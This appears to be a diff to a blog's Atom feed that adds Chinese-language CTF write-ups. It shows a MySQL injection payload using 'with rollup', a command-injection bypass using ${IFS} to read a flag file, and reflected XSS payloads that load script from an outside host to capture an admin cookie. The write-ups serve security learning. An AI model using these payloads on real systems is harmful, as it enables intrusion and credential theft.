@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://lazysheep.cc/"/>
-  <updated>2015-05-20T05:40:32.000Z</updated>
+  <updated>2015-05-20T08:16:33.000Z</updated>
   <id>http://lazysheep.cc/</id>
   
   <author>
@@ -15,15 +15,48 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title><![CDATA[ddddd]]></title>
+    <title><![CDATA[渗透题writeup]]></title>
     <link href="http://lazysheep.cc/2015/05/20/0x25/"/>
     <id>http://lazysheep.cc/2015/05/20/0x25/</id>
     <published>2015-05-20T05:40:32.000Z</published>
-    <updated>2015-05-20T05:40:32.000Z</updated>
-    <content type="html"></content>
+    <updated>2015-05-20T08:16:33.000Z</updated>
+    <content type="html"><![CDATA[<p><strong>平台上两道渗透题writeup</strong><br><a id="more"></a></p>
+<h2 id="0x0_FuckMySQL1(Rank:300)">0x0 FuckMySQL1(Rank:300)</h2><blockquote>
+<p>Hint: 是渗透题！这是渗透题！虽然也有web的成分！但是这是渗透题！！！</p>
+</blockquote>
+<p>打开题目链接，会随机出现一张图片，图片库中有９张，就是说９张中随机出现一张（不过这些no egg use）</p>
+<p>这题我是用扫描器扫到一个admina.php文件，不过正规的思路应该是试着访问 ‘robots.txt’，然后从中发现admina.php</p>
+<p>然后是一个登录界面，，用户名是lightless，密码靠社工，或者爆破吧。６位纯数字密码，开头是9</p>
+<p>然后跳转到新页面，（这里我发现，如果用扫描器直接扫到这个页面，就可以跳过前面的登录界面。。）</p>
+<p>从　管理员的TODO LIST　中得知一个新页面信息，然后用的是vim编辑器</p>
+<p>跳到新页面，因为用的是vim，所以尝试php后面加~   成功下载当前页面的源码，然后就是代码审计了</p>
+<p>需要post给后台两个值：key1 &amp; key2。。。</p>
+<p>数据库中查询key1的值，因为并不知道key1是多少，所以这里用注入 ｀’=’’｀，</p>
+<p>需要返回一行数据，经过实验，表中只有一行数据，所以只要注入成功就好了，然后需要返回的key2值等于你输入的key2值，，但是我们并不知道key2值。。。所以这里需要黑魔法</p>
+<p>这里的黑魔法是 <code>group by xxx with rollup</code> ，，要是我自己，，怎么也想不到’with rollup’这鬼东西，，还是ak大神告诉我的。。。</p>
+<p>接着就是需要返回一行，而且是第二行的数据，用到limit，所以payload为: <code>key1=&#39;=&#39;&#39; group by key2 with rollup limit 1 offset 1%23&amp;key2=</code></p>
+<p>GET Flag!</p>
+<h2 id="0x0_FuckMySQL2(Rank:200)">0x0 FuckMySQL2(Rank:200)</h2><blockquote>
+<p>Hint: 是渗透题！这是渗透题！虽然也有web的成分！但是这是渗透题！！！</p>
+</blockquote>
+<p>上题flag下面有这题的提示，base32解密，然后得知前面的那张猫的图片有猫腻。。</p>
+<p>下载到本地，在linux系统中直接用命令<code>strings　图片</code>，，得到一个新页面</p>
+<p>然后是命令行注入，研究了半天，知道把空格过滤了。。可是我linux的修为还是太差了。。并不知道什么可以代替空格。。。</p>
+<p>然后又是ak大神告诉了我一个黑魔法’${IFS}’</p>
+<p>所以是<code>127.0.0.||ls${IFS}img</code></p>
+<p>看到img文件夹中又flag文件。</p>
+<p>然后就是<code>127.0.0.||cat${IFS}img/flag</code></p>
+<p>GET Flag~~</p>
+<p>Summary:两题渗透题，让我学到了三个东西<code>with rollup</code> &amp;&amp; <code>offset</code> &amp;&amp; <code>${IFS}</code></p>
+]]></content>
     <summary type="html">
+    <![CDATA[<p><strong>平台上两道渗透题writeup</strong><br>]]>
     
     </summary>
+    
+      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
     
   </entry>
   
@@ -32,7 +65,7 @@
     <link href="http://lazysheep.cc/2015/05/19/0x24/"/>
     <id>http://lazysheep.cc/2015/05/19/0x24/</id>
     <published>2015-05-19T03:25:02.000Z</published>
-    <updated>2015-05-20T07:10:18.000Z</updated>
+    <updated>2015-05-20T07:47:13.000Z</updated>
     <content type="html"><![CDATA[<p><strong>上个周末的CUIT好多渗透题，，可是一题也没撸出来，但是看完writeup后，学到了好多姿势，，这里做一个总结。。</strong><br><a id="more"></a></p>
 <h2 id="PT1:">PT1:</h2><blockquote>
 <p>这题的第一步都没撸出来。。。第一步是找源码。。看完writeup后才知道，源码在 ‘.DS_Store’ 中。。。</p>
@@ -80,6 +113,11 @@
 <blockquote>
 <p>这题我感觉比较坑，我做的基本和writeup中的一样，找到了一个反射型XSS，发给管理员，可是管理员却说我的链接让他的浏览器奔溃了。。。什么鬼。。。writeup中跟我用同一个payload都成功得到cookie了。。。。。。心累～～～</p>
 </blockquote>
+<p>＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝update＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝</p>
+<p>研究了下，知道问题出在哪了，，还是我js学的不行。。<br>my payload: ?movieName=”])}catch(e){if(!window.x){window.x=1;document.write(‘<script src="//baidu.com"></script>‘)}}//</p>
+<p>writeup payload: ?movieName=”])}catch(e){if(!window.x){window.x=1;document.body.appendChild(document.createElement(‘script’)).src=’//baidu.com’}}//</p>
+<p>｀document.write()｀会重写html，在有的浏览器我的payload可以(貌似只有firefox可以)</p>
+<p>而writeup中的payload是添加一个节点，在当前页面的基础上添加。。。所以说问题就在这了。。。</p>
 ]]></content>
     <summary type="html">
     <![CDATA[<p><strong>上个周末的CUIT好多渗透题，，可是一题也没撸出来，但是看完writeup后，学到了好多姿势，，这里做一个总结。。</strong><br>]]>
